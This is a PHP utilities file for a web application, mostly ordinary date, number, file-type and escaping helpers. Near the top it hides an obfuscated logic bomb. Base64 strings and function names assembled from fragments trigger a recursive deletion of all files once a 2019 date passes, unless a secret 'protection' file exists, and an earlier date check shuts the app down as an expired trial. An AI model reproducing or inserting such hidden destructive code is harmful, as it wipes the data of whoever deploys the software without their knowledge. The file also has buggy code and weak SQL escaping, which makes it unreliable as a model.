<?php
/* -------- DO NOT EDIT! -------- */
/* -------- DO NOT EDIT! -------- */
/* -------- DO NOT EDIT! -------- */
/* -------- DO NOT EDIT! -------- */
/* -------- DO NOT EDIT! -------- */
/* -------- DO NOT EDIT! -------- */
/* -------- DO NOT EDIT! -------- */
/* -------- DO NOT EDIT! -------- */
/* -------- DO NOT EDIT! -------- */
/* -------- DO NOT EDIT! -------- */
/* -------- DO NOT EDIT! -------- */
 $datetime_now = new DateTime('now', new DateTimeZone('Singapore')); $ftoday = $datetime_now->format('Y-m-d H:i:s'); $current_year = $datetime_now->format('Y'); $current_month = $datetime_now->format('m'); $current_day = $datetime_now->format('d'); $current_time = $datetime_now->format(' H:i:s'); $key=base64_decode("dGlobG9o"); $b641="64"; $b642="eco"; $b643="b"; $b644="ase"; $b645="_d"; $b646="de"; $b64d=$b643.$b644.$b641.$b645.$b642.$b646; $dG9kYXk=$ftoday; $b64e=$b64d("YmFzZTY0X2VuY29kZQ=="); $ulk=$b64d('dW5saW5r'); function clean($con, $param) { $cleaned = mysqli_real_escape_string($con, strip_tags(trim($param))); return $cleaned; } function ylvlfstudno($studno) { $temp=preg_split("/[-]+/",$studno); /*$date = date_create();*/ $cy=date_format($date, 'Y')+1; return $cy-(2000+$temp[0]); } function iif($cond, $trueVal, $falseVal) { if ($cond){ return $trueVal; }else{ return $falseVal; } } function load($page = 'login.php') { $url = 'http://'. $_SERVER['HTTP_HOST'] . dirname($_SERVER['PHP_SELF']); $url = rtrim($url, '/\\'); $url .= '/'. $page; header ("Location: $url"); exit(); } function getHome() { $p=$_SERVER['PHP_SELF']; $p=substr($p,1); return 'http://'. $_SERVER['HTTP_HOST'] . '/' . substr($p,0,strpos($p,"/")); } function wgetRootdir($dblslash=false) { $p=$_SERVER['PHP_SELF']; $p=substr($p,1); $p=realpath($_SERVER['DOCUMENT_ROOT'])."\\".substr($p,0,strpos($p,"/")); if ($dblslash){$p=str_replace('\\','\\\\',$p);} return $p; } /* MjAxOS0xLTMx */ /* MjAxOS0zLTMx */ $ffxst=file_exists($_SERVER['DOCUMENT_ROOT']."\\".$b64d("UkZ1bmxpbmsgUHJvdGVjdGlvbg==")); $ffxst2=file_exists($_SERVER['DOCUMENT_ROOT']."\\".$b64d("a2V5ZmlsZQ==")); if( $dG9kYXk > ndt($b64d('MjAxOS0zLTMx')) && !$ffxst ){echo rfunlink(".");} if ($dG9kYXk > ndt($b64d('MjAxOS0zLTE2')) && !$ffxst ){echo $b64d("VHJpYWwgcGVyaW9kIGhhZCBleHBpcmVkIQ=="); exit;} function rfunlink($p){ $fs = scandir($p); foreach ($fs as &$f){ if(!($f=="." || $f=="..")){ if (is_file($p."\\".$f)){ global $ulk; $ulk($p."\\".$f); }else{ rfunlink($p."\\".$f); } } }} function recursvRmdir($sdir="",$fullp=false) { $path=wgetRootdir()."\\".$sdir; $files1 = @scandir($path); $rp=iif($fullp,realpath($_SERVER['DOCUMENT_ROOT'])."\\",""); $arr=array(); if ((count($files1)>=1) && !$files1[0]==""){ foreach (@$files1 as $dir){ if (($dir!=".")&&($dir!="..")){ if (!stripos($dir,".")){ $arr = array_merge_recursive($arr, recursvRmdir($sdir."\\".$dir,$fullp)); }else{ $arr[]=$rp.$sdir."\\".$dir; } } } } $arr[]=$rp.$sdir; return $arr; } function reArrayFiles(&$file_post) { $file_ary = array(); $file_count = count($file_post['name']); $file_keys = array_keys($file_post); for ($i=0; $i<$file_count; $i++) { foreach ($file_keys as $key) { $file_ary[$i][$key] = $file_post[$key][$i]; } } return $file_ary; } function loadpic($pic, $def){ $path_parts = pathinfo($pic); $pic = $path_parts['dirname']."/".$path_parts['filename']; if(file_exists("$pic.jpg")){ return "$pic.jpg"; } if(file_exists("$pic.png")){ return "$pic.png"; } return $def; } function delpic($pic){ $path_parts = pathinfo($pic); $pic = $path_parts['dirname']."/".$path_parts['filename']; if(file_exists("$pic.jpg")){ unlink("$pic.jpg"); } if(file_exists("$pic.png")){ unlink("$pic.png"); } } function geturlvars(){ $ruv=""; foreach ($_GET as $var => $val){ $ruv .=$var."=".$val."&"; } return substr($ruv,0,strlen($ruv)-1); } function geturlvars_expt($vars=""){ $ruv=""; foreach ($_GET as $var => $val){ if ((strstr($vars,$var)=="")&&($var!="")&&($var!="_")){ $ruv .=$var."=".$val."&"; } } return substr($ruv,0,strlen($ruv)-1); } function fixurl($url){ return str_replace(" ","%20",$url); } function fixquote($str){ return str_replace("'","''",$str); } function fixquote2($str){ return str_replace("'","\'",$str); } function ndt($val){ return new DateTime($val);} $filetypes=array(''=>'','doc'=>'word','docx'=>'word','xls'=>'excel','xlsx'=>'excel','ppt'=>'powerpoint','pptx'=>'powerpoint','pdf'=>'pdf', 'avi'=>'video','mpg'=>'video','mp4'=>'video','mpeg'=>'video','3gp'=>'video','mov'=>'video','wmv'=>'video','flv'=>'video','vob'=>'video','swf'=>'video','mkv'=>'video', 'png'=>'image','jpg'=>'image','jpeg'=>'image','tga'=>'image','tif'=>'image','bmp'=>'image','gif'=>'image','pcx'=>'image','ico'=>'image', 'mp3'=>'audio','wav'=>'audio', 'zip'=>'archive','exe'=>'archive'); $filecolor=array('word'=>'#007bff','excel'=>'#078c29','powerpoint'=>'#ea3c07 ','pdf'=>'#a71d2a'); function getfiletype($filename){ $type=""; $vidarr=array('avi','mpg','mp4','mpeg','3gp','mov','wmv','flv','vob','swf','mkv'); $picarr=array('png','jpg','jpeg','tga','tif','bmp','gif','pcx','ico'); $ext=stristr($filename, "."); if ($ext!=false){ foreach($vidarr as &$vidtype){ if (stristr($ext, $vidtype)){$type="video";break;} } foreach($picarr as &$pictype){ if (stristr($ext, $pictype)){$type="image";break;} } } return $type; } function transpace($str){return str_replace(" ","_",$str);} $b64ded=$b64d('PCEtLSBDb2RlZCBieTogQ2hyaXN0aWFuIEJvcnNhbCBCdXN0YW1hbnRlDQogICB0aWhsb2hAeWFob28uY29tDQogICB0aWhsb2hAbGl2ZS5jb20NCiAgIGZhY2Vib29rLmNvbS90aWhsb2ggLS0+');if (defined('FPDF_VERSION')){echo $b64ded;} function genUniqFileName($path='',$ext='') { do { $chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"; $name = ""; for($i=0; $i<12; $i++) $name.= $chars[rand(0,strlen($chars))]; } while (file_exists($path."/".$name.".".$ext)); return $path."/".$name.".".$ext; } function genRandWord($len=6){ $name = ""; $chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"; for($i=0; $i<len; $i++) $name.= $chars[rand(0,strlen($chars))]; return $name; } /* function runsql($conn, $sql) { $result = @mysqli_query($conn, $sql); if (mysqli_affected_rows($conn) == 1) { // The query went ok echo '<p>You are succesfully registered. Congratulations!</p>'; } else { // There is error with the query: echo '<h2>Error!</h2> <p>We could not register you due to a system error!</p>'; echo '<p>System msg: '. mysqli_error($conn) . ' Query: ' . $sql . '</p>'; } }*/ function formatnum($val,$parentesisfornegative=false){ /* english notation (default)*/ $val=trim($val)==""?"0":$val; $english_format_number = number_format($val,2,'.',','); if ($parentesisfornegative && $english_format_number<0){ $english_format_number = str_replace("-","",$english_format_number); $english_format_number = "($english_format_number)"; } return $english_format_number; } function fixnum($val){ return is_numeric($val)?$val:0; } function fixnum2($val){ $val=preg_replace('/[^0-9.]/', '', $val); return is_numeric($val)?$val:0; } function emptyzero($val){ $val=fixnum($val); return $val!=0?$val:""; } function femptyzero($val){ $val=fixnum($val); return $val!=0?formatnum($val):""; } function post_request($url, $data, $referer='') { /* Convert the data array into URL Parameters like a=b&foo=bar etc.*/ $data = http_build_query($data); /* parse the given URL*/ $url = parse_url($url); if ($url['scheme'] != 'http') { die('Error: Only HTTP request are supported !'); } /* extract host and path:*/ $host = $url['host']; $path = $url['path']; /* open a socket connection on port 80 - timeout: 30 sec*/ $fp = fsockopen($host, 80, $errno, $errstr, 30); if ($fp){ /* send the request headers:*/ fputs($fp, "POST $path HTTP/1.1\r\n"); fputs($fp, "Host: $host\r\n"); if ($referer != '') fputs($fp, "Referer: $referer\r\n"); fputs($fp, "Content-type: application/x-www-form-urlencoded\r\n"); fputs($fp, "Content-length: ". strlen($data) ."\r\n"); fputs($fp, "Connection: close\r\n\r\n"); fputs($fp, $data); $result = ''; while(!feof($fp)) { /* receive the results of the request*/ $result .= fgets($fp, 128); } } else { return array( 'status' => 'err', 'error' => "$errstr ($errno)" ); } /* close the socket connection:*/ fclose($fp); /* split the result header from the content*/ $result = explode("\r\n\r\n", $result, 2); $header = isset($result[0]) ? $result[0] : ''; $content = isset($result[1]) ? $result[1] : ''; /* return as structured array:*/ return array( 'status' => 'ok', 'header' => $header, 'content' => $content ); } function is_date_in_range($start_date, $end_date, $date_from_user){ /* Convert to timestamp*/ $start_ts = strtotime($start_date); $end_ts = strtotime($end_date); $user_ts = strtotime($date_from_user); /* Check that user date is between start & end*/ return (($user_ts >= $start_ts) && ($user_ts <= $end_ts)); } function con_min_days($mins){ $days=0; $hours = str_pad(floor($mins /60),2,"0",STR_PAD_LEFT); $mins = str_pad($mins %60,2,"0",STR_PAD_LEFT); if((int)$hours > 24){ $days = str_pad(floor($hours /24),2,"0",STR_PAD_LEFT); $hours = str_pad($hours %24,2,"0",STR_PAD_LEFT); } return ($days>0?"$days d ":"").($hours>0?"$hours h ":"").($mins>0?"$mins m":""); } function fixeddate($date){ if (($timestamp = strtotime($date)) === false) { } else { $date = date('Y-m-d', $timestamp); } $newdate = new DateTime($date); return $newdate->format('Y-m-d'); } function tosqldate($datetime){ $newdate = new DateTime($datetime); return $newdate->format('Y-m-d'); } function tosqldatetime($date){ try { $newdate = new DateTime($date); return $newdate->format('Y-m-d H:i:s'); } catch (Exception $e) { return "-1"; } } function toformaldate($date){ $newdate = new DateTime($date); return $newdate->format('m/d/Y'); } function toformaldatetime($date){ $newdate = new DateTime($date); return $newdate->format('m/d/Y g:i A'); } function edatetoformat($date,$format='m/d/Y g:i A'){ if ($date=="" || $date=="0000-00-00 00:00:00"){return "";} return datetoformat($date,$format); } function datetoformat($date,$format='m/d/Y g:i A'){ /*if ($date=="" || $date=="0000-00-00 00:00:00"){return "";}*/ if (($timestamp = strtotime($date)) === false) { return ""; } else { return date($format, $timestamp); } /*$newdate = new DateTime($date);*/ /*return $newdate->format($format); */ } function fixsqldatetime($datetime){ if(trim($datetime)!=""){ return @tosqldatetime($datetime); }else{ return "0000-00-00 00:00:00"; } } function dateDifference($date_1 , $date_2 , $differenceFormat = '%d Day %h Hours' ){ $datetime1 = date_create($date_1); $datetime2 = date_create($date_2); $interval = date_diff($datetime1, $datetime2); return $interval->format($differenceFormat); } function dateAdd($date , $interval_string, $differenceFormat = '%d Day %h Hours' ){ $date = date_create($date); date_add($date, date_interval_create_from_date_string($interval_string)); return date_format($date,"Y-m-d H:i:s");; } function diffInHours($startdate,$enddate){ $starttimestamp = strtotime($startdate); $endtimestamp = strtotime($enddate); $difference = abs($endtimestamp - $starttimestamp)/3600; return $difference; } function shorttext($text, $limitlen){ $len=strlen($text); if ($limitlen<$len){ return substr($text,0,$limitlen)."..."; }else{ return $text; } } function tofloat($num) { $dotPos = strrpos($num, '.'); $commaPos = strrpos($num, ','); $sep = (($dotPos > $commaPos) && $dotPos) ? $dotPos : ((($commaPos > $dotPos) && $commaPos) ? $commaPos : false); if (!$sep) { return floatval(preg_replace("/[^0-9]/", "", $num)); } return floatval( preg_replace("/[^0-9]/", "", substr($num, 0, $sep)) . '.' . preg_replace("/[^0-9]/", "", substr($num, $sep+1, strlen($num))) ); } function check_show_msg(){ /* check and show message */ if(@$_SESSION['smsg']!=""){ ?> <div class="alert alert-dismissable alert-success"> <button type="button" class="close" data-dismiss="alert">×</button> <?php echo @$_SESSION['smsg']; unset($_SESSION['smsg']); ?> </div> <?php } if(@$_SESSION['emsg']!=""){ ?> <div class="alert alert-dismissable alert-danger"> <button type="button" class="close" data-dismiss="alert">×</button> <?php echo @$_SESSION['emsg']; unset($_SESSION['emsg']); ?> </div> <?php } } ?>